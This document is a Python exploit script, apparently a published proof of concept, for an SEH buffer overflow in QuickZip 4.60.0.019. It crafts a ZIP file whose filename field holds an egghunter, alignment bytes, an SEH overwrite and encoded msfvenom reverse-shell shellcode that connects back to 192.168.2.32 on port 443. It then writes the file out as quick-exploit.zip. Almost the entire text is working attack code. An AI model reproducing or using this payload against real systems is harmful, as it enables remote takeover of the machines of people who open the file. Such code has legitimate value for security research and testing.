#/usr/bin/python
#Written By: Eric Van Zutphen
#Purpose: Quickzip 4.60.0.019  SEH Overflow


header_1 = ("\x50\x4B\x03\x04\x14\x00\x00\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\xe4\x0f\x00\x00\x00")

header_2 = ("\x50\x4B\x01\x02\x14\x00\x14\x00\x00\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\xe4\x0f\x00\x00\x00\x00\x00\x00\x01\x00"
"\x24\x00\x00\x00\x00\x00\x00\x00")

header_3 = ("\x50\x4B\x05\x06\x00\x00\x00\x00\x01\x00\x01\x00"
"\x12\x10\x00\x00\x02\x10\x00\x00\x00\x00")

"""
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.2.32 LPORT=443 -f python EXITFUNC=thread -v shellcode -b "\x00\x0a\x0d" -e x86/alpha_upper
"""
 
shellcode =  ""
shellcode += "\x89\xe2\xd9\xcc\xd9\x72\xf4\x5b\x53\x59\x49\x49"
shellcode += "\x49\x49\x43\x43\x43\x43\x43\x43\x51\x5a\x56\x54"
shellcode += "\x58\x33\x30\x56\x58\x34\x41\x50\x30\x41\x33\x48"
shellcode += "\x48\x30\x41\x30\x30\x41\x42\x41\x41\x42\x54\x41"
shellcode += "\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x58"
shellcode += "\x50\x38\x41\x43\x4a\x4a\x49\x4b\x4c\x4d\x38\x4b"
shellcode += "\x32\x55\x50\x45\x50\x33\x30\x45\x30\x4d\x59\x5a"
shellcode += "\x45\x36\x51\x39\x50\x43\x54\x4c\x4b\x56\x30\x36"
shellcode += "\x50\x4c\x4b\x46\x32\x54\x4c\x4c\x4b\x46\x32\x52"
shellcode += "\x34\x4c\x4b\x34\x32\x51\x38\x54\x4f\x4e\x57\x30"
shellcode += "\x4a\x51\x36\x56\x51\x4b\x4f\x4e\x4c\x47\x4c\x55"
shellcode += "\x31\x43\x4c\x44\x42\x56\x4c\x31\x30\x59\x51\x48"
shellcode += "\x4f\x54\x4d\x33\x31\x39\x57\x5a\x42\x4c\x32\x30"
shellcode += "\x52\x30\x57\x4c\x4b\x51\x42\x44\x50\x4c\x4b\x50"
shellcode += "\x4a\x47\x4c\x4c\x4b\x50\x4c\x42\x31\x32\x58\x4a"
shellcode += "\x43\x57\x38\x55\x51\x48\x51\x36\x31\x4c\x4b\x46"
shellcode += "\x39\x51\x30\x55\x51\x38\x53\x4c\x4b\x57\x39\x42"
shellcode += "\x38\x4b\x53\x56\x5a\x51\x59\x4c\x4b\x47\x44\x4c"
shellcode += "\x4b\x33\x31\x49\x46\x56\x51\x4b\x4f\x4e\x4c\x4f"
shellcode += "\x31\x48\x4f\x54\x4d\x45\x51\x59\x57\x37\x48\x4b"
shellcode += "\x50\x53\x45\x4b\x46\x35\x53\x53\x4d\x4a\x58\x37"
shellcode += "\x4b\x33\x4d\x46\x44\x34\x35\x4a\x44\x46\x38\x4c"
shellcode += "\x4b\x50\x58\x56\x44\x43\x31\x48\x53\x55\x36\x4c"
shellcode += "\x4b\x54\x4c\x30\x4b\x4c\x4b\x56\x38\x55\x4c\x43"
shellcode += "\x31\x4e\x33\x4c\x4b\x44\x44\x4c\x4b\x53\x31\x38"
shellcode += "\x50\x4d\x59\x37\x34\x46\x44\x47\x54\x31\x4b\x31"
shellcode += "\x4b\x43\x51\x50\x59\x51\x4a\x46\x31\x4b\x4f\x4d"
shellcode += "\x30\x51\x4f\x31\x4f\x50\x5a\x4c\x4b\x34\x52\x5a"
shellcode += "\x4b\x4c\x4d\x31\x4d\x33\x58\x46\x53\x36\x52\x35"
shellcode += "\x50\x43\x30\x35\x38\x34\x37\x34\x33\x37\x42\x31"
shellcode += "\x4f\x31\x44\x32\x48\x30\x4c\x54\x37\x36\x46\x34"
shellcode += "\x47\x4b\x4f\x59\x45\x4f\x48\x5a\x30\x43\x31\x35"
shellcode += "\x50\x33\x30\x36\x49\x58\x44\x56\x34\x30\x50\x42"
shellcode += "\x48\x31\x39\x4b\x30\x42\x4b\x43\x30\x4b\x4f\x58"
shellcode += "\x55\x36\x30\x50\x50\x36\x30\x36\x30\x51\x50\x36"
shellcode += "\x30\x47\x30\x30\x50\x55\x38\x4b\x5a\x54\x4f\x59"
shellcode += "\x4f\x4b\x50\x4b\x4f\x59\x45\x5a\x37\x53\x5a\x54"
shellcode += "\x45\x35\x38\x49\x50\x4f\x58\x45\x52\x57\x50\x45"
shellcode += "\x38\x55\x52\x33\x30\x45\x51\x4f\x4b\x4b\x39\x4b"
shellcode += "\x56\x42\x4a\x32\x30\x56\x36\x50\x57\x35\x38\x4c"
shellcode += "\x59\x4f\x55\x52\x54\x45\x31\x4b\x4f\x39\x45\x4c"
shellcode += "\x45\x39\x50\x32\x54\x34\x4c\x4b\x4f\x50\x4e\x53"
shellcode += "\x38\x42\x55\x4a\x4c\x52\x48\x4a\x50\x48\x35\x59"
shellcode += "\x32\x46\x36\x4b\x4f\x48\x55\x52\x48\x53\x53\x52"
shellcode += "\x4d\x42\x44\x35\x50\x4c\x49\x4a\x43\x50\x57\x31"
shellcode += "\x47\x50\x57\x46\x51\x4b\x46\x52\x4a\x35\x42\x30"
shellcode += "\x59\x51\x46\x4d\x32\x4b\x4d\x45\x36\x38\x47\x37"
shellcode += "\x34\x57\x54\x57\x4c\x43\x31\x45\x51\x4c\x4d\x51"
shellcode += "\x54\x56\x44\x32\x30\x59\x56\x43\x30\x57\x34\x51"
shellcode += "\x44\x56\x30\x30\x56\x56\x36\x46\x36\x51\x56\x31"
shellcode += "\x46\x50\x4e\x51\x46\x51\x46\x31\x43\x56\x36\x42"
shellcode += "\x48\x43\x49\x48\x4c\x37\x4f\x4d\x56\x4b\x4f\x58"
shellcode += "\x55\x4d\x59\x4d\x30\x30\x4e\x51\x46\x51\x56\x4b"
shellcode += "\x4f\x46\x50\x32\x48\x55\x58\x4b\x37\x55\x4d\x33"
shellcode += "\x50\x4b\x4f\x59\x45\x4f\x4b\x4d\x30\x55\x4d\x57"
shellcode += "\x5a\x34\x4a\x53\x58\x4f\x56\x5a\x35\x4f\x4d\x4d"
shellcode += "\x4d\x4b\x4f\x4e\x35\x37\x4c\x55\x56\x53\x4c\x34"
shellcode += "\x4a\x4d\x50\x4b\x4b\x4d\x30\x32\x55\x34\x45\x4f"
shellcode += "\x4b\x50\x47\x54\x53\x42\x52\x32\x4f\x42\x4a\x43"
shellcode += "\x30\x56\x33\x4b\x4f\x38\x55\x41\x41"



print "[+] Building PoC.."

max_size = 4064
#00407A33

egg = 'T00WT00W'
egghunter  = "JJJJJJJJJJJRYVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJIE6K1YZKO4OG20RCZS2PXHMFNWL5UQJSDJONXPT6PFPPWLKJZNOD5KZNOT5KWKOZGA"
align = "\x61\x53\x5c"
align += "\x25\x4A\x4D\x4E\x55"
align += "\x25\x35\x32\x31\x2A"
align += "\x2D\x20\x20\x20\x21\x2D\x62\x62\x63\x7E\x2D\x7E\x7D\x7D\x7D\x50"
align += "\x25\x4A\x4D\x4E\x55"
align += "\x25\x35\x32\x31\x2A"
align += "\x2D\x20\x41\x20\x20\x2D\x21\x7E\x20\x5D\x2D\x3E\x7E\x60\x7E\x50"



nops = "\x41" * 10

payload =   nops + egghunter + "A"*(286-len(egghunter)- len(align) - len(nops)) + align + nops + '\x71\x9b\x70\x9b' + '\x2b\x32\x40\x00' + egg + shellcode + "D" *(3760- len(shellcode) - len(egg))
payload += ".txt"

print "[+] Length = " + str(len(payload))

exploit = header_1 + payload + header_2 + payload + header_3

mefile = open('quick-exploit.zip','w');
mefile.write(exploit);
mefile.close()

print "[+] Exploit complete!"
